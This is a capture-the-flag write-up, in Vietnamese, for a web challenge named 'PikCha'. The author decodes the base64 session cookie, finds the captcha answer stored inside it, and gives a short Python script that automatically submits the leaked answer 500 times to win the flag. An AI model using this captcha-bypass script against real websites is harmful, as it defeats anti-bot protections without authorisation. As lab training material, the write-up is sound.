PikCha
===
**Category:** Web

**Author:** Soul#8230
### Description
- Site: `http://104.197.195.221:8084`

### Overview
Trang web có một ô chúng ta input vào và kèm theo đó là 4 hình ảnh liên tục thay đổi sau mỗi lần ta refesh. Có vẻ như mục đích của site là chúng ta chỉ cần input và đúng 500/500 liên tục thì sẽ có flag. Kiểm tra cookie thì có một `session` và mỗi lần chúng ta refesh thì cũng thay đổi.

### Solution
Như chúng ta thấy thì site có session nên chúng ta thử jwt decode nó xem coi dữ liệu của nó là gì 
![image](https://user-images.githubusercontent.com/54855855/113515643-ee94cd00-959f-11eb-993d-2a9102c61c7f.png)
Kết quả chúng ta nhận thấy được phần header chính là bao gôm answer, số lần đúng và hình ảnh hoạt hình.
Ban đầu mình thử như cộng trừ các số đó rồi submit nhưng vẫn không đúng được bất kì cái nào, tiếp tục mình theo dõi hình ảnh xem hình nào nằm cân bằng (giống như xác nhận capcha) thì mình lấy con số mà tương ứng với vị trí của hình đó nhưng cũng fail. Cuối cùng mình thử nhập các số đó vô thẳng trực tiếp thì nhận được câu trả lời đúng.
Như cookie ở trên thì mình nhập vô là `28 120 20 95` => mình chỉ cần viết script đơn giản để auto việc này để có thể solved 500/500 thì có flag.

##### Payload
- `poc.py`
```py
from re import findall, sub
import requests
import base64
import json

def decode_base64(data, altchars=b'+/'):
    data = sub(r'[^a-zA-Z0-9%s]+' % altchars, '', data)  # normalize
    missing_padding = len(data) % 4
    if missing_padding:
        data += '='* (4 - missing_padding)
    return base64.b64decode(data, altchars)

url="http://104.197.195.221:8084/"
ses = requests.Session()

while True:
	r = ses.get(url)
	data=(r.cookies["session"]).split(".")[0]
	decode_data = decode_base64(data)
	payload = json.loads(decode_data)['answer']
	data_format = " ".join(str(i) for i in payload)
	r1 = ses.post(url = url, data = {"guess":data_format})
	print(r1.text)
```
